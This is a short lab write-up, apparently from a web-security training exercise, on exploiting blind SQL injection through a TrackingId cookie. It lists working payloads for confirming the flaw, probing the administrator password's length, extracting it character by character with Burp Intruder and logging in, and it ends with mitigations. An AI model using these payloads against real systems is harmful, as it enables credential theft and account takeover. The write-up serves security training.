# SQL Injection – Blind SQLi (Conditional Response)

# Vulnerability Overview
The application is vulnerable to blind SQL Injection via the TrackingId cookie. The response includes a “Welcome back” message when a query condition evaluates to true, enabling data extraction through conditional responses.

# Steps to Reproduce
*Navigate to*
* /filter?category=Pets

*Identify injection point (Cookie)*
* Intercept request using Burp Suite and modify TrackingId

* * TrackingId=xyz'

* * * “Welcome back” message disappears
* * * Confirms SQL injection

*Confirm conditional behavior*
* TrackingId=xyz' AND 1=1--
* * “Welcome back” visible (TRUE)

* * TrackingId=xyz' AND 1=2--

* * * “Welcome back” disappears (FALSE) → Confirms conditional response

*Confirm existence of administrator user*
* TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
* * “Welcome back” visible → User exists

*Determine password length*
* TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>20--
* * FALSE

* TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
* * TRUE → Password length = 20

*Extract password (character by character)*
* TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
* TRUE/FALSE used to determine each character

Repeat for positions 1–20.

*Automate using Burp Intruder*
* Attack type: Sniper
* Payload: a–z, 0–9
* Use Grep Match: “Welcome back”
* Extract correct character per position

*Login*
* Username: administrator
* Password: extracted password

* * Successful login

# Payload Used
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

# Impact
An attacker can extract sensitive data such as user credentials through blind SQL injection, leading to full account compromise, including administrative access.

# Tools Used
* Burp Suite (Proxy, Repeater, Intruder)

# Mitigation
* Use parameterized queries
* Avoid dynamic SQL
* Implement proper input validation
* Disable verbose response indicators
